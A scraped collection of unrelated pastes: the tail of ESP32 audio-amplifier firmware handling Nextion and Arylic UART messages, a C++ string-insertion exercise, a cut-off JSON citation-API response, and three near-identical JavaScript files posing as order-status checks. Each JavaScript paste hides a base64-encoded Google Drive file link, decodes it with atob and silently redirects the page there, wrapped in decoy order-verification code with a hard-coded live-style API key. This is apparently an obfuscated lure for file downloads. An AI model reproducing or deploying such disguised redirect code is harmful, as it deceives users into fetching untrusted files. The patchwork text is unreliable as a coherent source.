        } else if (sReceived.startsWith(""BT"")) {  //////////// BLUETOOTH
          sourceS = 1;
          inputLed(1);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...BLUETOOTH..."");
          nextion.txt(""main.input"", ""Bluetooth"");
        } else if (sReceived.startsWith(""LINE-IN"")) {  //////////// LINE-IN
          sourceS = 2;
          inputLed(2);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...LINE-IN..."");
          nextion.txt(""main.input"", ""Line In"");
        } else if (sReceived.startsWith(""USBDAC"")) {  //////////// USB DAC
          sourceS = 3;
          inputLed(3);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...USB DAC..."");
          nextion.txt(""main.input"", ""USB DAC"");
        } else if (sReceived.startsWith(""OPT"")) {  //////////// USB DAC
          sourceS = 4;
          inputLed(4);
          meta(0, 0, 0, 0);
          if (debug == 1) Serial.println(""...SPDIF..."");
          nextion.txt(""main.input"", ""SPDIF"");
        }
      } else if (sReceived.startsWith(""VOL:"") && (NextionPage == main)) {  //////////// VOLUME HANDLING
        reduce4();
        int index = sReceived.indexOf(';');
        sReceived = sReceived.substring(0, index);
        if (sReceived == ""100"") {
          nextion.txt(""volText"", ""MAX"");
        } else if (sReceived == ""0"") {
          nextion.txt(""volText"", ""MIN"");
        } else {
          if (debug == 1) Serial.println(""volume:  -|:"" + sReceived);
          digiVolume = sReceived.toInt();
          nextion.txt(""volText"", sReceived);
        }
        nextion.systemVal(""digiVol"", digiVolume);
        rotaryEncoder.setEncoderValue(digiVolume);
      } else if (sReceived.startsWith(""MUT:"")) {  //////////// MUTE HANDLING
        reduce4();
        sReceived = sReceived.substring(0, 1);
        if (debug == 1) Serial.println(""Mute:_____/:|"" + sReceived);
        if (sReceived == ""1"") {
          dmute = 1;
          nextion.txt(""volText"", ""MIN"");
          nextion.systemVal(""digiVol"", 0);
        } else if (sReceived == ""0"") {
          dmute = 0;
          nextion.txt(""volText"", String(digiVolume));
          nextion.systemVal(""digiVol"", digiVolume);
        }

      } else if (sReceived.startsWith(""BTC:"")) {  //////////// BLUETOOTH CONNECTION HANDLING
        reduce4();
        sReceived = sReceived.substring(0, 1);
        if (sReceived == ""1"") {
          //nextion.txt(""main.infoText"", ""CONNECTED"");
          uart.print(""TIT;"");
          inputLed(8);
        } else if (sReceived == ""0"") {
          //nextion.txt(""main.infoText"", ""DISCONNECTED"");
          inputLed(9);
        }
      } else if (sReceived.endsWith(""SYS:ON;"") && (NextionPage == standby)) {  //////////// POWER ON HANDLING //25.01.10
        // tone(23, 2000, 50);
        nextion.txt(""standby.powerOn"", ""STARTING"");
        nextion.setPco(""standby.powerOn"", 34784);
        Serial.println(""arrived SYS:ON...(1)"");
        digitalWrite(pwr, HIGH);
        nextion.pageChange(main);
        // if (NextionPage == main) {
        // digitalWrite(speaker, HIGH);
        // }

        speaker1timeon = 1;
      } else if (sReceived.startsWith(""NET:"")) {  //////////// NETWORK CONNECTION HANDLING
        reduce4();
        sReceived = sReceived.substring(0, 1);
        if (sReceived == ""1"") {
          //nextion.txt(""main.infoText"", ""CONNECTED"");
          inputLed(6);
          uart.print(""TIT;"");
          nextion.touchSet(""main.preset"", 1);
          //inputLed(0);
        } else if (sReceived == ""0"") {
          //nextion.txt(""main.infoText"", ""DISCONNECTED"");
          nextion.touchSet(""main.preset"", 0);
          inputLed(7);
        }
      } else if (sReceived.startsWith(""TIT:"") && (NextionPage == main)) {  //////////// Title
        reduce4();
        if (debug == 1) Serial.println(""Title: "" + sReceived);
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        nextion.txt(""main.title"", sReceived);
      } else if (sReceived.startsWith(""ART:"") && (NextionPage == main)) {  //////////// Artist
        reduce4();
        if (debug == 1) Serial.println(""Artist: "" + sReceived);
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        nextion.txt(""main.artist"", sReceived);
      } else if (sReceived.startsWith(""ELP:"")) {  //////////// Elapsed playing time
        reduce4();
        int index = sReceived.indexOf(""/"");
        sReceived = sReceived.substring(0, index);
        // Serial1.println(sReceived);
        long time = sReceived.toInt();
        time = time / 100;
        int tenth = time % 10;
        time = time / 10;
        long hour = time / 3600;
        time = time - (hour * 3600);
        long min = time / 60;
        long sec = time - (min * 60);
        String timeS = ""Time: "";
        if (hour < 10) timeS += ""0"";
        timeS += String(hour) + "":"";
        if (min < 10) timeS += ""0"";
        timeS += String(min) + "":"";
        if (sec < 10) timeS += ""0"";
        timeS += String(sec);  // + ""."" + String(tenth);
        if (time > 0) nextion.txt(""main.elapsed"", timeS);

      } else if (sReceived.startsWith(""BAS:"")) {  //////////// BASS
        reduce4();
        int bass = sReceived.toInt();
        nextion.val(""digiSetup.nbass"", bass);
        if (bass < 0) {
          bass = 11 - abs(bass);
        } else {
          bass = bass + 11;
        }
        nextion.val(""digiSetup.hbass"", bass);

      } else if (sReceived.startsWith(""TRE:"")) {  //////////// TREBLE
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        int treb = sReceived.toInt();
        nextion.val(""digiSetup.ntreb"", treb);
        if (treb < 0) {
          treb = 11 - abs(treb);
        } else {
          treb = treb + 11;
        }
        nextion.val(""digiSetup.htreb"", treb);

      } else if (sReceived.startsWith(""WSS:"") && (NextionPage == digiSetup)) {  //////////// WIFI SIGNAL STRENGTH
        reduce4();
        int signalWifi = sReceived.toInt();
        Serial.println(""WiFi signal strength: "" + sReceived);
        nextion.val(""digiSetup.nWifi"", signalWifi);

      } else if (sReceived.startsWith(""BSS:"") && (NextionPage == digiSetup)) {  //////////// BLUETOOTH SIGNAL STRENGTH
        reduce4();
        int signalBT = sReceived.toInt();
        Serial.println(""Bluetooth signal strength: "" + sReceived);
        nextion.val(""digiSetup.nBt"", signalBT);

      } else if (sReceived.startsWith(""MXV:"")) {  //////////// Max volume, %
        reduce4();
        int volMax = sReceived.toInt();
        nextion.val(""digiSetup.nVolMax"", volMax);
        nextion.val(""digiSetup.hVolMax"", volMax);
        if (debug == 2) Serial.println(volMax);

      } else if (sReceived.startsWith(""VBS:"")) {  //////////// Virtual Bass ON/OFF
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        if (sReceived == ""1"") {
          nextion.val(""digiSetup.vbs"", 1);
          if (debug == 2) Serial.println(""VBS: on"");
        } else {
          nextion.val(""digiSetup.vbs"", 0);
          if (debug == 2) Serial.println(""VBS: off"");
        }
      } else if (sReceived.startsWith(""PMT:"")) {  //////////// Promt Voice ON/OFF
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        if (sReceived == ""1"") {
          nextion.val(""digiSetup.pmt"", 1);
          if (debug == 2) Serial.println(""PMT: on"");
        } else {
          nextion.val(""digiSetup.pmt"", 0);
          if (debug == 2) Serial.println(""PMT: off"");
        }

      } else if (sReceived.startsWith(""NAM:"")) {  //////////// Device name
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        String dname, Nname;
        int h = 16, sz = 0, dsz = 0;
        if (sReceived.length() > 0) {
          for (int i = 0; i <= sReceived.length() - 1; i = i + 1) {
            dname = sReceived.substring(i, i + 1);
            if (dname.toInt() >= 0 && dname.toInt() <= 9) {
              sz = dname.toInt();
              // if (debug) Serial.println(dname);
            }
            if (dname == ""A"") sz = 10;
            if (dname == ""B"") sz = 11;
            if (dname == ""C"") sz = 12;
            if (dname == ""D"") sz = 13;
            if (dname == ""E"") sz = 14;
            if (dname == ""F"") sz = 15;
            // sz += sz * h;
            if (h == 0) {
              dsz += sz;
              // if (debug) Serial.printf(""%i. sz=%i\n"", i, dsz);
              Nname += char(dsz);
              dsz = 0;
            } else {
              dsz = sz * 16;
            }
            h = 16 - h;
          }
          if (debug == 1) Serial.println(Nname);
          nextion.txt(""main.NAME"", Nname);
        }
      } else if (sReceived.startsWith(""IPA:"")) {  //////////// Device IP address for connecting to browser's control panel, psw:admin
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);  //removing "";""
        nextion.txt(""digiSetup.digiIP"", sReceived);
      } else if (sReceived.startsWith(""VND:"")) {  //////////// Vendor - Tidal, Spotify, etc...
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);  //removing "";""
        nextion.txt(""main.vaVendor"", sReceived);
      } else if (sReceived.startsWith(""PST:"")) {  //////////// Preset, not response, only command (1-10)
        reduce4();
        sReceived = sReceived.substring(0, sReceived.length() - 1);
        if (debug == 1) Serial.println("";;;;;;;;;; "" + sReceived);
      } else if (sReceived.startsWith(""VST:"")) {
        reduce4();
        String nTemp = sReceived.substring(4);  //////////// VST HANDLING
        volStep = sReceived.toInt();
        nextion.val(""digiSetup.nVolStep"", volStep);
        nextion.val(""digiSetup.hVolStep"", volStep);
        Serial.println(""VST: "" + sReceived);
      }
      sReceived = """";
    }
    while (Serial1.available()) {  //////////// UART HANDLING FOR NEXTION
      nReceived = Serial1.readStringUntil(';');
      // Serial.println(nReceived);
      if (nReceived.startsWith(""NPG:"")) {  //////////// NEXTION PAGE NUMBER
        reduce4n();
        // nReceived = nReceived.substring(4);
        Serial.println(nReceived + ""  "");
        Serial.print(""Nextion PageChange to: "");
        Serial.println(nReceived.toInt());
        NextionPage = nReceived.toInt();
        toDigi = 0;
      }
      if (nReceived == ""SYS:STANDBY"") {  //////////// STANDBY COMMAND
        Serial.println(""StandBy for the Nextion..."");
        digitalWrite(pwr, LOW);
        digitalWrite(speaker, LOW);
        //delay(powerOffDelayForRelay);
        inputLed(4);
        // tone(23, 1000, 50);
        powerState = 0;
      }
      if (nReceived == ""LDR:0"") {  //////////// LDR OFF
        toDigi = 0;
        if (debug == 2) Serial.println(""LDR OFF"");
      }
      if (nReceived == ""LDR:1"") {  //////////// LDR ON
        toDigi = 0;
        if (debug == 2) Serial.println(""LDR ON"");
      }
      if (nReceived == ""ESP:RESTART"") {  //////////// FULL RESTART
        ESP.restart();
      }
      if (nReceived == ""ESP:SPKON"") {  ////////////  SPEAKER RESTART
        digitalWrite(speaker, HIGH);
        nextion.systemVal(""warning"", 0);
        nextion.vis(""ampSetup.resetSPK"", 0);
      }
      if (debug == 1) Serial.println(""++++++++++Serial1:__|"" + nReceived + "";"");
      if (toDigi == 1) uart.print(nReceived + "";"");
      toDigi = 1;
    }
    if (NextionPage == 0) powerState = 1;
  } else {
    readProtection();
    while (uart.available()) {  //////////// UART HANDLING FOR ARYLIC

      sReceived = uart.readStringUntil('\n');
      sReceived.trim();
      //reduce4();
      Serial.println(sReceived);

      Serial.println(""bakkfitty"");
      if (sReceived.startsWith(""STA:"")) {
        nextion.val(""boot.vaArylic"", 1);
        Serial.println(""-----------------------------------------------------------------------------------"");
        if (acError == 0 && dcErrorRight == 0 && dcErrorLeft == 0) {  //AC ERROR =0
          self_test = 0;
          //delay(5000);
          Serial.printf(""Selftest %d\n"", self_test);
        }
        // initDigi = 1;
        //uart.print(""SYS:REBOOT;"");
        // digitalWrite(pwr, HIGH);
        // Serial.println(""PSU is ON!"");
      }
    }
    sReceived = """";
  }
}  //////////////////// End of Loop  ////////////////////
void reduce4() {
  sReceived = sReceived.substring(4);
}
"
PYizYiyV,Products.js,dentira,JavaScript,Friday 11th of April 2025 09:12:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40858/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fVmUmUt7,Untitled,dllbridge,C,Friday 11th of April 2025 09:01:33 AM CDT,"


#include <iostream>
#include   <string>
using namespace std;


//////////////////////////////////////////////////////////////////
int main()
{
	
    string s1 = ""Akbulatov Maxim Aleksandrovich Sony Pictures"";

    int n = 0;

    
    do {      n  = s1.find("" "", n+2);
           
           if(n == -1) break;
        
		   s1.insert(n, "","");
		
    } while(1); 

    cout << s1 << endl;
}









 // cout << ""n = "" << n << endl; 
	//	




/*

#include  <iostream>
#include   <iomanip>
using namespace std;

string  s1 = ""Lisicin Valerievich""; 
string  s2 =              ""Victor"";

//////////////////////////////////////////////////////////////////
int main()                                                      //
{

    int n = s1.find("" "");
	
	cout << ""n = "" << n << endl;

	s1.insert(n,  s2);
	s1.insert(n, "" "");
		
    cout << ""s1 = "" << s1 << endl; 
}




*/













/*
#include <iostream>
#include  <iomanip>
using namespace std;


string  s1     =     ""SONY 123 Pictures""; 

char   sz2[99] = ""Pictures"";


//////////////////////////////////////////////////////////////////
int main() 
{

  
	for(int i = 0; i < s1.length(); i++)
	{
    
        cout << "" s1["" << setw(2) << i << ""] = "" << s1[i] << endl; 
    }
	
return 0;
}







*/







/*
#include <iostream>
#include  <string.h>
using namespace std;


string  s1     =     "" SONY___""; 

char   sz2[99] = ""Pictures"";


//////////////////////////////////////////////////////////////////
int main() 
{

    strcat(sz2, s1.c_str());
	
    
    cout << "" sz2 = "" << sz2 << endl; 
	
	
return 0;
}



*/











/*


#include <iostream>
using namespace std;


string  s1     =     ""SONY___""; 

char   sz2[99] = "" Pictures"";


//////////////////////////////////////////////////////////////////
int main() 
{

    s1 += sz2;
	
    
    cout << "" s1 = "" << s1 << endl; 
	
	
return 0;
}


*/





"
DLvR19TT,Order.js,dentira,JavaScript,Friday 11th of April 2025 08:56:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14586/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1Dk9JVw1,Market.js,dentira,JavaScript,Friday 11th of April 2025 08:41:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48860/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tkN2V451,Untitled,IronJoo,JSON,Friday 11th of April 2025 08:37:24 AM CDT,"{""query"":{""total_results"":1,""pages"":1,""results_per_page"":50,""current_page"":1,""search"":{""identifiers"":""10.1111\/joes.12111"",""format"":""json"",""sort"":""date"",""page"":1},""description"":""Articles in the given set of identifiers"",""next_page_url"":false},""facets"":{""cited_in_years"":[{""key"":""2024"",""doc_count"":1},{""key"":""2022"",""doc_count"":1},{""key"":""2021"",""doc_count"":1},{""key"":""2020"",""doc_count"":1},{""key"":""2019"",""doc_count"":1},{""key"":""2018"",""doc_count"":1},{""key"":""2017"",""doc_count"":1},{""key"":""2015"",""doc_count"":1}],""open_author_countries"":[{""key"":""Portugal"",""doc_count"":1}],""oa_status"":[{""key"":""green"",""doc_count"":1}],""citing_policy_source_tertiary_classifications"":[{""key"":""Development Bank"",""doc_count"":1},{""key"":""Financial Institution or Bank"",""doc_count"":1},{""key"":""International Body"",""doc_count"":1},{""key"":""Mixed Roles"",""doc_count"":1},{""key"":""National Body"",""doc_count"":1},{""key"":""Policy Centre"",""doc_count"":1},{""key"":""Public Service"",""doc_count"":1},{""key"":""Regional or State Level Body"",""doc_count"":1},{""key"":""Research Centre"",""doc_count"":1}],""published_year"":[{""key"":2016,""doc_count"":1}],""with_journal_subject"":[],""cited_by_policy_sources"":[{""key"":""set:special:highlight_sources"",""star"":true,""doc_count"":""unknown"",""title"":""Your key sources""},{""key"":""aerckenya"",""doc_count"":1,""title"":""African Economic Research Consortium""},{""key"":""finnishgovernment"",""doc_count"":1,""title"":""Government of Finland""},{""key"":""governmentofcanada"",""doc_count"":1,""title"":""Government of Canada""},{""key"":""iadb"",""doc_count"":1,""title"":""Inter-American Development Bank""},{""key"":""ifnsweden"",""doc_count"":1,""title"":""Institutet f\u00f6r N\u00e4ringslivsforskning""},{""key"":""illinoisgov"",""doc_count"":1,""title"":""State of Illinois""},{""key"":""imf"",""doc_count"":1,""title"":""International Monetary Fund""},{""key"":""izade"",""doc_count"":1,""title"":""IZA Institute of Labor Economics""},{""key"":""nber"",""doc_count"":1,""title"":""NBER""},{""key"":""rijksoverheid"",""doc_count"":1,""title"":""Rijksoverheid""},{""key"":""seoamsterecon"",""doc_count"":1,""title"":""SEO Amsterdam Economics""},{""key"":""snsse"",""doc_count"":1,""title"":""Studief\u00f6rbundet N\u00e4ringsliv och Samh\u00e4lle""}],""unique_source_count"":null,""medline_types"":[],""type"":[{""key"":""journal-article"",""doc_count"":1}],""pinned_items_for_has_institution"":[],""funded_by"":[{""key"":""fundref __OVSEP__ Faculdade de Ci\u00eancias e Tecnologia, Universidade Nova de Lisboa"",""doc_count"":1},{""key"":""fundref __OVSEP__ Universidade Nova de Lisboa"",""doc_count"":1}],""medline_mesh"":[],""citing_classifications"":[{""key"":""arts, culture and entertainment>culture"",""doc_count"":1},{""key"":""conflicts, war and peace>armed conflict>war"",""doc_count"":1},{""key"":""crime, law and justice>judiciary>court"",""doc_count"":1},{""key"":""economy, business and finance"",""doc_count"":1},{""key"":""economy, business and finance>business information>business finance"",""doc_count"":1},{""key"":""economy, business and finance>business information>business finance>earnings"",""doc_count"":1},{""key"":""economy, business and finance>business information>human resources>management"",""doc_count"":1},{""key"":""economy, business and finance>economic sector"",""doc_count"":1},{""key"":""economy, business and finance>economic sector>financial and business service>banking"",""doc_count"":1},{""key"":""economy, business and finance>economic sector>financial and business service>insurance"",""doc_count"":1},{""key"":""economy, business and finance>economy"",""doc_count"":1},{""key"":""economy, business and finance>economy>macro economics>credit and debt"",""doc_count"":1},{""key"":""economy, business and finance>economy>macro economics>investments"",""doc_count"":1},{""key"":""economy, business and finance>market and exchange>loan market>loans"",""doc_count"":1},{""key"":""education"",""doc_count"":1},{""key"":""education>school>further education"",""doc_count"":1},{""key"":""education>school>higher education>university"",""doc_count"":1},{""key"":""health"",""doc_count"":1},{""key"":""health>healthcare policy>health insurance"",""doc_count"":1},{""key"":""labour"",""doc_count"":1},{""key"":""labour>employment"",""doc_count"":1},{""key"":""labour>retirement"",""doc_count"":1},{""key"":""labour>unemployment"",""doc_count"":1},{""key"":""politics"",""doc_count"":1},{""key"":""politics>government"",""doc_count"":1},{""key"":""science and technology"",""doc_count"":1},{""key"":""science and technology>mathematics"",""doc_count"":1},{""key"":""science and technology>social sciences"",""doc_count"":1},{""key"":""science and technology>social sciences>economics"",""doc_count"":1},{""key"":""society"",""doc_count"":1},{""key"":""society>demographics"",""doc_count"":1},{""key"":""society>demographics>immigration"",""doc_count"":1},{""key"":""society>discrimination"",""doc_count"":1},{""key"":""society>social condition"",""doc_count"":1},{""key"":""society>values"",""doc_count"":1}],""citing_policy_source_secondary_classifications"":[{""key"":""Government"",""doc_count"":1},{""key"":""IGO"",""doc_count"":1},{""key"":""Think Tank"",""doc_count"":1}],""citing_policy_source_primary_classifications"":[{""key"":""Public Sector"",""doc_count"":1},{""key"":""Third Sector"",""doc_count"":1}],""citing_topics"":[{""key"":""Africa"",""doc_count"":1},{""key"":""African Americans"",""doc_count"":1},{""key"":""American Community Survey"",""doc_count"":1},{""key"":""Annuity (European)"",""doc_count"":1},{""key"":""Asia"",""doc_count"":1},{""key"":""Asian Americans"",""doc_count"":1},{""key"":""Assumption"",""doc_count"":1},{""key"":""Attitude (psychology)"",""doc_count"":1},{""key"":""Australia"",""doc_count"":1},{""key"":""Average treatment effect"",""doc_count"":1},{""key"":""Balance of trade"",""doc_count"":1},{""key"":""Bangladesh"",""doc_count"":1},{""key"":""Bank"",""doc_count"":1},{""key"":""Behavioral economics"",""doc_count"":1},{""key"":""Bias"",""doc_count"":1},{""key"":""Black-owned businesses"",""doc_count"":1},{""key"":""Blinder\u2013Oaxaca decomposition"",""doc_count"":1},{""key"":""Bulgaria"",""doc_count"":1},{""key"":""Business"",""doc_count"":1},{""key"":""Business cycle"",""doc_count"":1},{""key"":""Business economics"",""doc_count"":1},{""key"":""Business loan"",""doc_count"":1},{""key"":""Canada Revenue Agency"",""doc_count"":1},{""key"":""Cannabis (drug)"",""doc_count"":1},{""key"":""Cannabis dispensaries in the United States"",""doc_count"":1},{""key"":""Cannabis in Illinois"",""doc_count"":1},{""key"":""Capital (economics)"",""doc_count"":1},{""key"":""Catalina Amuedo-Dorantes"",""doc_count"":1},{""key"":""Causality"",""doc_count"":1},{""key"":""Census"",""doc_count"":1},{""key"":""Chi-squared test"",""doc_count"":1},{""key"":""Classification of ethnicity in the United Kingdom"",""doc_count"":1},{""key"":""Coefficient of determination"",""doc_count"":1},{""key"":""Constitution of the United States"",""doc_count"":1},{""key"":""Controlled Substances Act"",""doc_count"":1},{""key"":""Corporate tax"",""doc_count"":1},{""key"":""Correlation"",""doc_count"":1},{""key"":""Correlation and dependence"",""doc_count"":1},{""key"":""Credit"",""doc_count"":1},{""key"":""Credit card"",""doc_count"":1},{""key"":""Credit risk"",""doc_count"":1},{""key"":""Credit score"",""doc_count"":1},{""key"":""Culture"",""doc_count"":1},{""key"":""Current account"",""doc_count"":1},{""key"":""Data"",""doc_count"":1},{""key"":""Debt"",""doc_count"":1},{""key"":""Degrees of freedom (statistics)"",""doc_count"":1},{""key"":""Demography"",""doc_count"":1},{""key"":""Denmark"",""doc_count"":1},{""key"":""Dependent and independent variables"",""doc_count"":1}],""journal"":[{""key"":""Journal of Economic Surveys"",""doc_count"":1}],""cited_by_policy_source_region"":[{""key"":""Africa"",""doc_count"":1},{""key"":""EEA"",""doc_count"":1},{""key"":""EU27"",""doc_count"":1},{""key"":""Europe"",""doc_count"":1},{""key"":""G20"",""doc_count"":1},{""key"":""G7"",""doc_count"":1},{""key"":""International Organizations"",""doc_count"":1},{""key"":""LIC"",""doc_count"":1},{""key"":""Medium human development"",""doc_count"":1},{""key"":""Non-OECD members"",""doc_count"":1},{""key"":""Nordics"",""doc_count"":1},{""key"":""North America"",""doc_count"":1},{""key"":""OECD members"",""doc_count"":1},{""key"":""Sub-Saharan Africa"",""doc_count"":1},{""key"":""UNICEF Programme Countries"",""doc_count"":1},{""key"":""Very high human development"",""doc_count"":1}],""cited_by_policy_source_country"":[{""key"":""Canada"",""doc_count"":1},{""key"":""Finland"",""doc_count"":1},{""key"":""Germany"",""doc_count"":1},{""key"":""IGO"",""doc_count"":1},{""key"":""Kenya"",""doc_count"":1},{""key"":""Netherlands"",""doc_count"":1},{""key"":""Sweden"",""doc_count"":1},{""key"":""USA"",""doc_count"":1},{""key"":""USA > Illinois"",""doc_count"":1}],""open_affiliations"":[{""key"":""Instituto Politecnico de Setubal"",""doc_count"":1},{""key"":""University Institute of Lisbon"",""doc_count"":1}],""open_institution_authors"":[{""key"":""Instituto Politecnico de Setubal __OVSEP__ Sandrina Berthault Moreira __OVSEP__ sandrina berthault moreira"",""doc_count"":1},{""key"":""University Institute of Lisbon __OVSEP__ Nadia Simoes __OVSEP__ nadia simoes"",""doc_count"":1},{""key"":""University Institute of Lisbon __OVSEP__ Nuno Crespo __OVSEP__ nuno crespo"",""doc_count"":1}],""publisher"":[{""key"":""Wiley"",""doc_count"":1}],""cited_by_policy_source_type"":[{""key"":""government"",""doc_count"":1},{""key"":""igo"",""doc_count"":1},{""key"":""igo > development bank"",""doc_count"":1},{""key"":""think tank"",""doc_count"":1},{""key"":""think tank > research centre"",""doc_count"":1},{""key"":""think tank > university affiliated"",""doc_count"":1}],""identifiers"":[{""key"":""List of identifiers entered"",""doc_count"":1}]},""results"":{""results"":[{""title"":""INDIVIDUAL DETERMINANTS OF SELF-EMPLOYMENT ENTRY: WHAT DO WE REALLY KNOW?"",""doi"":""10.1111\/joes.12111"",""document_url"":""https:\/\/doi.org\/10.1111\/joes.12111"",""journal"":""Journal of Economic Surveys"",""publisher"":""Wiley"",""type"":""journal-article"",""published_on"":""2016-09-01T00:00:00+00:00"",""authors"":[""Nadia Simoes"",""Nuno Crespo"",""Sandrina Berthault Moreira""],""orcids"":[],""open_institution_authors"":[""University Institute of Lisbon __OVSEP__ Nadia Simoes __OVSEP__ nadia simoes"",""University Institute of Lisbon __OVSEP__ Nuno Crespo __OVSEP__ nuno crespo"",""Instituto Politecnico de Setubal __OVSEP__ Sandrina Berthault Moreira __OVSEP__ sandrina berthault moreira""],""language"":""en"",""abstract"":"""",""abstract_short"":"""",""funders"":[""fundref __OVSEP__ Faculdade de Ci\u00eancias e Tecnologia, Universidade Nova de Lisboa"",""fundref __OVSEP__ Universidade Nova de Lisboa""],""grant_ids"":[""Faculdade de Ci\u00eancias e Tecnologia, Universidade Nova de Lisboa __OVSEP__ PEst\u2010OE\/EGE\/UI0315\/2011"",""Universidade Nova de Lisboa __OVSEP__ PEst\u2010OE\/EGE\/UI0315\/2011""],""citations"":19,""affiliations"":[],""cited_by_documents"":[{""policy_document_id"":""aerckenya-32896d244b77f9c67ed75a16519691db"",""policy_source_id"":""aerckenya"",""source_title"":""African Economic Research Consortium"",""document_title"":""Financial Inclusion and Entrepreneurship in Six sub-Saharan African Countries: Evidence from Finaccess and Finscope Survey Data"",""published_on"":""2024-04-10"",""document_url"":""https:\/\/publication.aercafricalibrary.org\/items\/4387c5f4-4f65-4460-829f-be0dcfa82685"",""type"":""think tank"",""subtype"":"""",""country"":""Kenya"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Financial inclusion"",""Entrepreneurship"",""Survey methodology""],""classifications"":[""economy, business and finance>economy"",""science and technology"",""science and technology>social sciences>economics""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=aerckenya-32896d244b77f9c67ed75a16519691db""},{""policy_document_id"":""aerckenya-da78ba25f3dea93b39b3f4f3ac5fe328"",""policy_source_id"":""aerckenya"",""source_title"":""African Economic Research Consortium"",""document_title"":""Inclusion Financi\u00e8re et Entrepreneuriat dans Six Pays d'Afrique Subsaharienne : Les Donn\u00e9es des Enqu\u00eates Finaccess et Finscope"",""published_on"":""2024-04-10"",""document_url"":""https:\/\/publication.aercafricalibrary.org\/items\/0fc3863c-27b1-4680-82fe-142ace32354e"",""type"":""think tank"",""subtype"":"""",""country"":""Kenya"",""source_primary_classification"":""Third Sector"",""source_secondary_classification"":""Think Tank"",""source_tertiary_classification"":""Research Centre|OVSEP|Policy Centre"",""topics"":[""Finance"",""Bank"",""Africa""],""classifications"":[""economy, business and finance>economy"",""science and technology"",""economy, business and finance>economic sector>financial and business service>banking""],""url"":""https:\/\/www.overton.io\/document.php?policy_document_id=aerckenya-da78ba25f3dea93b39b3f4f3ac5fe328""},{""policy_document_id"":""finnishgovernment-52a6031b52e49a47fac24cee8a8c4e9b"",""policy_source_id"":""finnishgovernment"",""source_title"":""Government of Finland"",""document_title"":""Valto: Osaaminen ja ty\u00f6llisyys digimurroksessa"",""published_on"":""2017-02-20"",""document_url"":""http:\/\/julkaisut.valtioneuvosto.fi\/handle\/10024\/160234"",""type"":""government"",""subtype"":"""",""country"":""Finland"",""source_primary_classification"":""Public Sector"",""source_secondary_classification"":""Government"",""source_tertiary_classification"":""National Body|OVSEP|Mixed Roles"",""topics"":[""Internet of things"",""Unemployment"",""Internet""],""classifications"":[""science and technology"",""labour"",""economy, business and 